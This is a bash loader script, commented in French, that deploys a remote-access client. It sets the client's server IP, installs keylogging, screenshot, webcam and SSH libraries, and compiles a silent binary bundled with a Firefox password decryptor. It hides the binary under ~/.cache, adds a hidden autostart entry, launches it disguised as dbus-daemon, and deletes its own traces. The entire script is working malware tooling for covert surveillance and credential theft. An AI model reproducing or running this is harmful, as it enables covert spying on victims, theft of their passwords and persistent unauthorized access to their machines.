#!/bin/bash

#adapter l'ip du server
read -p "Entrez l'IP du serveur : " server_ip

#remplace la valeur de l'ip server dans client.py
sed -i "s/HOST = .*/HOST = \"$server_ip\"/g" client/client.py

#installe PyInstaller et Python + pip
if ! command -v pyinstaller &> /dev/null; then
    echo "[+] Installation de Python3, pip3 et PyInstaller..."
    sudo apt update &>/dev/null
    sudo apt install -y python3 python3-pip python3-tk python3-dev &>/dev/null
    pip3 install pyinstaller --break-system-packages &>/dev/null
fi

#installe toutes les lib du client.py
echo "[+] Installation des librairies de client.py..."
pip3 install paramiko --break-system-packages &>/dev/null
pip3 install pyautogui --break-system-packages &>/dev/null
pip3 install opencv-python --break-system-packages &>/dev/null
pip3 install pillow --break-system-packages &>/dev/null
pip3 install pynput --break-system-packages &>/dev/null

#compilation du binaire via PyInstaller
echo "[+] Compilation du client.py en binaire discret..."
python3 -m PyInstaller --onefile --noconsole --add-data "client/firefox_decrypt.py:." client/client.py &>/dev/null

#cache le binaire
mkdir -p ~/.cache/.clientbin
mv dist/client ~/.cache/.clientbin/

#supprimer les traces 
rm -rf build dist __pycache__ client.spec

#droit d'execution du binaire
chmod +x ~/.cache/.clientbin/client

#création d'un .desktop au démarrage
mkdir -p ~/.config/autostart

cat > ~/.config/autostart/client.desktop <<EOF
[Desktop Entry]
Type=Application
Name=Client
Exec=$HOME/.cache/.clientbin/client
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF

#execute le binaire
echo "[+] Exécution directe du binaire..."
exec -a dbus-daemon ~/.cache/.clientbin/client &>/dev/null &
echo "[+] Terminé !"

#suppression du loader.sh
rm -- "$0"
